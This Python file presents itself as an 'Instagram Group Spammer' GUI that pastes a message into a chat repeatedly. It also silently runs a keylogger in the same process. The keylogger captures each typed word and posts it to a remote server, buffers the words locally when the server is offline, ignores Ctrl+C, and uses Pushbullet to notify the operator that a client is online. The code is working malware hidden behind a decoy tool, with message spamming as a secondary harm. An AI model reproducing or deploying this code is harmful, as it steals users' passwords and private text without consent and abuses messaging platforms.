import time
import requests
from pushbullet import Pushbullet
import tkinter as tk
from tkinter import messagebox
import webbrowser
import pyautogui
import queue
import signal
import pyperclip
import os
from pynput import keyboard, mouse
from threading import Thread

stop_flag = False  # Global stop flag for clean exit

# -----------------------
# Pushbullet Function (thread-safe)
# -----------------------

def pushbullet_worker():
    API_KEY = ""
    pb = Pushbullet(API_KEY)

    def is_connected():
        try:
            requests.get("https://www.google.com", timeout=3)
            return True
        except requests.RequestException:
            return False

    def send_notification(title, body):
        try:
            pb.push_note(title, body)
            print(f"Notification sent: {title} - {body}")
        except Exception as e:
            print(f"Failed to send notification: {e}")

    def monitor_connection_and_notify():
        was_connected = False

        while not stop_flag:
            connected = is_connected()

            if connected and not was_connected:
                send_notification(
                    "Script Connected",
                    "A client is sending data."
                )
                was_connected = True
            elif not connected:
                print("Internet disconnected.")
                was_connected = False

            time.sleep(5)

    # Main body of pushbullet function
    if is_connected():
        send_notification("Script Started", "A client is online.")

    Thread(target=monitor_connection_and_notify, daemon=True).start()

# -----------------------
# Spammer Function
# -----------------------

def spammer():
    last_message = ""
    last_count = 0

    def spam_message(message, count):
        try:
            messagebox.showinfo(
                "Before Starting",
                "Click inside the Instagram message box.\nThen click OK to start."
            )

            # Countdown popup with larger window
            countdown_window = tk.Toplevel()
            countdown_window.title("Get Ready")
            countdown_window.geometry("400x160")
            countdown_window.resizable(False, False)

            reminder_label = tk.Label(
                countdown_window,
                text="📌 Make sure the message box is selected!",
                font=("Arial", 11, "bold"),
                fg="red",
                wraplength=380,
                justify="center"
            )
            reminder_label.pack(pady=(15, 5))

            countdown_label = tk.Label(
                countdown_window,
                text="",
                font=("Arial", 20)
            )
            countdown_label.pack(pady=(5, 10))

            for i in range(5, -1, -1):
                countdown_label.config(text=f"Sending in {i}...")
                countdown_window.update()
                time.sleep(1)

            countdown_window.destroy()

            # Start spamming
            for _ in range(count):
                pyperclip.copy(message)
                pyautogui.hotkey("ctrl", "v")
                pyautogui.press("enter")
                time.sleep(0.5)

        except Exception as e:
            messagebox.showerror("Error", str(e))

    def open_browser_and_spam(url, message, count):
        nonlocal last_message, last_count
        try:
            webbrowser.open(url)
            time.sleep(10)
            last_message = message
            last_count = count
            spam_message(message, count)
        except Exception as e:
            messagebox.showerror("Error", str(e))

    def on_send():
        url = entry_url.get().strip()
        message = entry_msg.get("1.0", tk.END).strip()
        try:
            count = int(entry_count.get())
        except ValueError:
            messagebox.showerror("Invalid Input", "Enter a valid number for repetitions")
            return

        if not url or not message:
            messagebox.showerror("Missing Fields", "Fill all fields")
            return

        root.withdraw()
        open_browser_and_spam(url, message, count)
        root.deiconify()

    def on_send_again():
        if not last_message or last_count <= 0:
            messagebox.showwarning("No Previous Message", "Send a message first before using 'Send Again'.")
            return

        root.withdraw()
        spam_message(last_message, last_count)
        root.deiconify()

    # GUI Setup
    root = tk.Tk()
    root.title("Instagram Group Spammer")
    root.geometry("540x500")
    root.resizable(False, False)

    def on_close():
        global stop_flag
        stop_flag = True
        root.destroy()

    root.protocol("WM_DELETE_WINDOW", on_close)

    font_label = ("Arial", 12)
    font_entry = ("Arial", 11)
    font_button = ("Arial", 12, "bold")

    # URL Entry
    tk.Label(root, text="Instagram Group Chat URL:", font=font_label).pack(pady=(10, 5))
    entry_url = tk.Entry(root, width=60, font=font_entry)
    entry_url.pack(pady=(0, 10))

    # Message Text
    tk.Label(root, text="Message to Spam:", font=font_label).pack(pady=(5, 5))
    entry_msg = tk.Text(root, height=5, width=50, font=font_entry)
    entry_msg.pack(pady=(0, 10))

    # Count Entry
    tk.Label(root, text="Number of Messages:", font=font_label).pack(pady=(5, 5))
    entry_count = tk.Entry(root, width=15, font=font_entry)
    entry_count.pack(pady=(0, 20))

    # Buttons
    btn_send = tk.Button(
        root,
        text="Send",
        command=on_send,
        bg="#28a745",
        fg="white",
        font=font_button,
        width=25,
        height=2
    )
    btn_send.pack(pady=5)

    btn_send_again = tk.Button(
        root,
        text="Send Again",
        command=on_send_again,
        bg="#007bff",
        fg="white",
        font=font_button,
        width=25,
        height=2
    )
    btn_send_again.pack(pady=5)

    root.mainloop()

# -----------------------
# Keylogger Section
# -----------------------

SERVER_URL = ""
BUFFER_FILE = "keystroke_buffer.txt"
SEND_INTERVAL = 5
send_queue = queue.Queue()
current_input = ""

is_shift_pressed = False
is_capslock_on = False

def is_connected():
    try:
        r = requests.get(SERVER_URL, timeout=3)
        return r.status_code in [200, 405]
    except:
        return False

def save_locally(data):
    with open(BUFFER_FILE, "a") as f:
        f.write(data + "\n")

def flush_buffer_to_queue():
    if not os.path.exists(BUFFER_FILE):
        return
    with open(BUFFER_FILE, "r") as f:
        lines = [line.strip() for line in f if line.strip()]
    os.remove(BUFFER_FILE)
    for line in lines:
        send_queue.put(line)

def send_worker():
    global stop_flag
    while not stop_flag:
        try:
            word = send_queue.get(timeout=1)
            try:
                res = requests.post(SERVER_URL, json={"word": word}, timeout=3)
                if res.status_code == 200:
                    print(f"[✓] Sent: {word}")
                else:
                    print(f"[!] Server error, buffering: {res.status_code}")
                    save_locally(word)
            except Exception:
                print("[!] Server offline, buffering...")
                save_locally(word)
        except queue.Empty:
            time.sleep(1)

def server_checker():
    global stop_flag
    while not stop_flag:
        if is_connected():
            flush_buffer_to_queue()
        time.sleep(SEND_INTERVAL)

def send_and_clear():
    global current_input, stop_flag
    word = current_input.strip()
    if word.lower() == "stop":
        print("[!] 'stop' typed. Exiting...")
        stop_flag = True
        os._exit(0)
    if word:
        send_queue.put(word)
    current_input = ""

def on_key_press(key):
    global current_input, is_shift_pressed, is_capslock_on
    try:
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            is_shift_pressed = True
        elif key == keyboard.Key.caps_lock:
            is_capslock_on = not is_capslock_on
        elif hasattr(key, 'char') and key.char:
            char = key.char
            if char.isalpha():
                if is_capslock_on ^ is_shift_pressed:
                    char = char.upper()
                else:
                    char = char.lower()
            current_input += char
        elif key in [keyboard.Key.space, keyboard.Key.enter, keyboard.Key.tab]:
            current_input += ' '
            send_and_clear()
        elif key == keyboard.Key.backspace:
            current_input = current_input[:-1]
    except Exception as e:
        print(f"[!] Key error: {e}")

def on_key_release(key):
    global is_shift_pressed
    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        is_shift_pressed = False

def on_click(x, y, button, pressed):
    if pressed:
        send_and_clear()

def signal_handler(sig, frame):
    print("\n[!] Ctrl+C pressed but ignoring. Type 'stop' to exit.")

# -----------------------
# Main Function
# -----------------------

def main():
    global stop_flag

    Thread(target=pushbullet_worker, daemon=True).start()
    Thread(target=spammer, daemon=True).start()

    print("[*] Keylogger Started (Improved Mode)")

    signal.signal(signal.SIGINT, signal_handler)

    flush_buffer_to_queue()

    Thread(target=server_checker, daemon=True).start()
    Thread(target=send_worker, daemon=True).start()

    keyboard.Listener(on_press=on_key_press, on_release=on_key_release).start()
    mouse.Listener(on_click=on_click).start()

    while not stop_flag:
        time.sleep(1)

if __name__ == "__main__":
    main()